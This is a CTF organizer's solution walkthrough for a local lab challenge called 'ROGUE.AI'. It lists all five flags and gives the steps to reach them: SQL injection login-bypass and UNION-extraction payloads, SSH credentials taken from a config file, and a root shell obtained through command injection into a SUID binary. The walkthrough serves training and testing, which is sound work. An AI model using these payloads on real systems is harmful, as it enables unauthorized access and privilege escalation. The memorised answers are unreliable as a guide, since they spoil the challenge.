# ROGUE.AI - Complete Solution Walkthrough

This document provides the complete solution for CTF organizers to test the challenge.

---

## FLAG 1: Welcome Flag
**Location:** Main web page
**Flag:** `CTF{w3lc0me_to_th3_syst3m}`

### Steps:
1. Navigate to `http://localhost:5000`
2. The flag is displayed on the main page
3. No exploitation required

---

## FLAG 2: SQL Injection
**Location:** System logs (requires admin access)
**Flag:** `CTF{sql_1nj3ct10n_m4st3r}`

### Method 1: SQL Injection Bypass
1. On the login page, enter in the username field:
   ```
   ' OR '1'='1
   ```
2. Leave password blank or enter anything
3. Click "ACCESS SYSTEM"
4. You'll be logged in as the first user in the database (guest)
5. To get admin access, try:
   ```
   admin'--
   ```
   (This comments out the password check)

### Method 2: Using Admin Credentials
If you want to bypass SQL injection practice:
- Username: `admin`
- Password: `Sup3rS3cur3P4ss!`

### Finding the Flag:
1. Once logged in as admin (via SQL injection or credentials)
2. Click "System Logs" from the dashboard
3. Flag is in log entry #3: `CTF{sql_1nj3ct10n_m4st3r}`

---

## FLAG 3: SSH Credentials
**Location:** Config file in File Browser
**Flag:** `CTF{ssh_4cc3ss_gr4nt3d}`

### Steps:
1. Must be logged in as admin or system user (see FLAG 2)
2. From dashboard, click "File Browser"
3. Click on `config.bak` file to expand it
4. You'll see:
   ```
   SSH Access:
   Username: ctfuser
   Password: artemis2024

   Flag: CTF{ssh_4cc3ss_gr4nt3d}
   ```
5. Note these credentials for the next stage

---

## FLAG 4: Privilege Escalation
**Location:** `/root/flag4.txt` (requires root access)
**Flag:** `CTF{pr1v1l3g3_3sc4l4t10n_pwn3d}`

### Step 1: SSH Access
```bash
ssh ctfuser@localhost -p 2222
# Password: artemis2024
```

### Step 2: Initial Reconnaissance
```bash
# You'll see the welcome message automatically
ls -la                    # List files
cat NOTES.txt             # Read hints about backup_tool
cat .bash_history         # See previous commands
```

### Step 3: Find SUID Binaries
```bash
find / -perm -4000 2>/dev/null
```

You'll find `/usr/local/bin/backup_tool` with SUID bit set (owned by root).

### Step 4: Test the Vulnerable Binary
```bash
# Try to read a root file
backup_tool /root/flag4.txt
```

You'll get a hint message! It tells you that simply reading files isn't enough - you need a proper ROOT SHELL.

### Step 5: Exploit Command Injection for Shell Access
The binary is vulnerable to command injection. Use the `-p` flag to preserve privileges:

```bash
backup_tool "; /bin/bash -p"
```

**Important:** The `-p` flag tells bash to run in privileged mode, keeping the SUID permissions!

Alternative methods:
```bash
backup_tool "; sh -p"
backup_tool "x; bash -p"
```

### Step 6: Verify Root Access
```bash
whoami          # Should show 'root'
id              # Should show uid=0(root)
```

### Step 7: Find and Read Flag 4
Now that you have a root shell, explore for hidden files:

```bash
ls -la /root/   # List ALL files including hidden ones
```

You'll see `.flag4.txt` (hidden file). Read it:

```bash
cat /root/.flag4.txt
```

You'll see: `CTF{pr1v1l3g3_3sc4l4t10n_pwn3d}`

---

## FLAG 5: Final Flag (Cryptography)
**Location:** `/root/artemis_shutdown.enc` (encrypted)
**Flag:** `CTF{4rt3m1s_shutd0wn_c0mpl3t3}`

### Prerequisites:
Must be root (see FLAG 4)

### Steps:
1. As root (you should already have done `ls -la /root` in previous step), you'll see:
   - `flag4.txt` (hint file)
   - `.flag4.txt` (hidden - the real FLAG 4)
   - `artemis_shutdown.enc` (encrypted file)
   - `decrypt_tool.py` (decryption script)

2. Run the decryption tool:
   ```bash
   python3 /root/decrypt_tool.py
   ```

4. The script will decrypt and display the final flag:
   ```
   CTF{4rt3m1s_shutd0wn_c0mpl3t3}
   ```

---

## Alternative Exploitation Methods

### SQL Injection Variations
```sql
-- In username field:
' OR '1'='1'--
admin'--
' OR 1=1--
' UNION SELECT NULL,NULL,NULL,NULL--

-- Extracting data:
' UNION SELECT username,password,NULL,NULL FROM users--
```

### Privilege Escalation Variations
```bash
# Note: flag4.txt contains a hint, not the real flag!
# The real flag is in /root/.flag4.txt (hidden file)

# Getting a shell (multiple methods):
backup_tool "; /bin/bash -p"      # Recommended - preserves privileges
backup_tool "; sh -p"              # Also works
backup_tool "; bash -p"            # Alternative
backup_tool "x; bash -p"           # Doesn't matter what's before ;

# Once you have a root shell:
ls -la /root/                      # Find hidden files
cat /root/.flag4.txt               # Read the real flag
python3 /root/decrypt_tool.py      # Get FLAG 5
```

---

## Testing Checklist for Organizers

- [ ] Web interface loads on port 5000
- [ ] SSH service responds on port 2222
- [ ] SQL injection works on login
- [ ] Admin access grants access to logs
- [ ] Flag 2 visible in logs
- [ ] Config.bak file visible to admin users
- [ ] SSH credentials work
- [ ] Welcome message displays on SSH login
- [ ] backup_tool binary has SUID bit
- [ ] Command injection works in backup_tool
- [ ] Root access achievable
- [ ] Flag 4 readable as root
- [ ] Decrypt tool works
- [ ] Final flag displays correctly

---

## Common Issues and Fixes

### Container won't start
```bash
docker-compose logs
docker-compose down
docker-compose up -d --build
```

### SSH connection refused
Wait 10-15 seconds after container starts for SSH to initialize.

### Web app not responding
```bash
docker exec -it rogue-ai-artemis bash
ps aux | grep python
```

### Can't become root via backup_tool
```bash
# Check SUID bit:
docker exec -it rogue-ai-artemis ls -la /usr/local/bin/backup_tool
# Should show: -rwsr-xr-x ... root root ... backup_tool
```

---

## Summary of All Flags

1. `CTF{w3lc0me_to_th3_syst3m}` - Welcome page
2. `CTF{sql_1nj3ct10n_m4st3r}` - System logs (SQL injection)
3. `CTF{ssh_4cc3ss_gr4nt3d}` - Config file
4. `CTF{pr1v1l3g3_3sc4l4t10n_pwn3d}` - Root flag
5. `CTF{4rt3m1s_shutd0wn_c0mpl3t3}` - Final encrypted flag

---

## Estimated Completion Time

- **Beginner:** 1-2 hours
- **Intermediate:** 30-45 minutes
- **Advanced:** 15-20 minutes

---

## Educational Value

This challenge teaches:
1. **Web Security:** SQL injection fundamentals
2. **Reconnaissance:** File discovery, reading hints
3. **Linux Skills:** SSH, file navigation, command execution
4. **Privilege Escalation:** SUID exploitation, command injection
5. **Cryptography:** Basic encoding/decoding concepts
6. **Problem Solving:** Following clues, reading documentation

All techniques used are fundamental in real penetration testing and CTF competitions.
